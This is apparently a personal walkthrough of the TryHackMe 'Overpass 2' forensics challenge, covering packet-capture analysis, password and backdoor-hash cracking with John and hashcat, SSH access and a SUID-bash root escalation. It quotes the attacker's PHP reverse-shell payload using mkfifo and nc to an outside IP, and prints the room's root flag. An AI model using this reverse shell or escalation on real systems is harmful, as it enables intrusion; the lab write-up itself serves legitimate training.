
- - - 
created : 18-07-2025 

Tags : #easy #Forensics
- - - 
# Objective

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.

Can you work out how the attacker got in, and hack your way back into [Overpass](./Overpass.md) production server?

Note: Although this room is a walkthrough, it expects familiarity with tools and Linux. I recommend learning basic [Wireshark](../../3%20-%20Tags/Hacking%20Tools/Wireshark.md) and completing [Linux Fundamentals](https://tryhackme.com/module/linux-fundamentals) as a bare minimum.  

md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc

# Recon

## WireShark

First we look into the download and we have a [Wireshark](../../3%20-%20Tags/Hacking%20Tools/Wireshark.md) capture file :

![Pasted image 20250718204403.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718204403.png)

So we have a payload and the URL .

We can also see the [Payload](../../3%20-%20Tags/Hacking%20Concepts/Payload.md) :

![Pasted image 20250718205213.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718205213.png)

```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

We can find the password used for escalation by searching for the string 'passw' :

![Pasted image 20250718210221.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718210221.png)

![Pasted image 20250718210608.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718210608.png)

A [Persistence](../../3%20-%20Tags/Hacking%20Concepts/Persistence.md) attempt :

![Pasted image 20250718210844.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718210844.png)

We can find all the password retrieved by the attacker :

![Pasted image 20250718211408.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718211408.png)

## John The Ripper

Now we can crack all the passwords with [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) and see how many we got with the fasttrack.txt wordlist :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Overpass2]
└─$ john passwd /usr/share/wordlists/fasttrack.txt 
Warning: only loading hashes of type "sha512crypt", but also saw type "tripcode"
Use the "--format=tripcode" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 12 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst

secret12         (bee)
abcd123          (szymex)
1qaz2wsx         (muirland)
secuirty3        (paradox)
```

So we have 4 .

## Backdoor Analysis

We can now analyze the [Backdoor](../../3%20-%20Tags/Hacking%20Concepts/Backdoor.md) used as [Payload](../../3%20-%20Tags/Hacking%20Concepts/Payload.md), to do that we are going to actually download it and read it, we can find the [Hash](../../3%20-%20Tags/Hacking%20Concepts/Hash.md) of the [Backdoor](../../3%20-%20Tags/Hacking%20Concepts/Backdoor.md) :

![Pasted image 20250718212952.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718212952.png)

In order to find the hardcoded salt we are going to have to analyze the source code. We are able to do this on the GitHub website. The piece that we are specifically looking for is going to be in the main.go portion of code :

![Pasted image 20250718213115.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718213115.png)ù

We saw previously that the attacker used a custom hash :

![Pasted image 20250718213837.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718213837.png) :

The salt (remember that the salt is hardcoded) is appended to the password, and [SHA512](../../3%20-%20Tags/Hacking%20Concepts/SHA512.md) of the resulting string makes the hash. To summarize, we have :
```
 SHA512(password + '1c362db832f3f864c8c2fe05f2002a05') = '6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed'
```

Now, let’s crack it with [Hashcat](../../3%20-%20Tags/Hacking%20Tools/Hashcat.md) (we’ll use the mode `1710`, which corresponds to `sha512($pass.$salt)`):

```
$ hashcat --force -m 1710 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512($pass.$salt)
Hash.Target......: 6d05358f090eea56a238af02e47d44ee5489d234810ef624028...002a05
Time.Started.....: Sun Aug 16 18:44:00 2020 (2 secs)
Time.Estimated...: Sun Aug 16 18:44:02 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   149.3 kH/s (0.50ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 18432/14344385 (0.13%)
Rejected.........: 0/18432 (0.00%)
Restore.Point....: 16384/14344385 (0.11%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: christal -> tanika
```

# Hacking

Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.

There’s flags on the box that Overpass can’t afford to lose by formatting the server!

## Website 

So the port 80 is showing this message :

![Pasted image 20250718214928.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718214928.png)

## SSH

We can access [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) with james and the cracked password on port 2222 (see payload) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Overpass2]
└─$ ssh james@10.10.173.247 -p 2222         
The authenticity of host '10.10.173.247 (10.10.173.247)' can't be established.
ED25519 key fingerprint is SHA256:M+alDmfQ9SPk8CLKIRe6QQD9sNcr/ptoDNbQLZDzIqs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.173.247' (ED25519) to the list of known hosts.
root@10.10.173.247's password: 
```

tried the **password** retrieved from cracking the **SHA-512 hash** earlier with [Hashcat](../../3%20-%20Tags/Hacking%20Tools/Hashcat.md). This failed for port 22 but worked for port 2222, now we cat the user flag :

```
root@ip-10-10-50-126:~# ssh james@10.10.53.38 -p 2222
The authenticity of host '[10.10.53.38]:2222 ([10.10.53.38]:2222)' can't be established.
RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[10.10.53.38]:2222' (RSA) to the list of known hosts.
james@10.10.53.38's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$ id
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
james@overpass-production:/home/james/ssh-backdoor$ 
```
# Privilege Escalation

In the directory of current logged user have **[.suid_bash](https://gtfobins.github.io/gtfobins/bash/#suid)** :

```
james@overpass-production:/home/james$ ls -la
total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Jul 21  2020 www
```

We got root and readed the txt file

```
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# whoami
root
.suid_bash-4.4# cat /root/root.txt
thm{d53b2684f169360bb9606c333873144d}
```

Pwned !!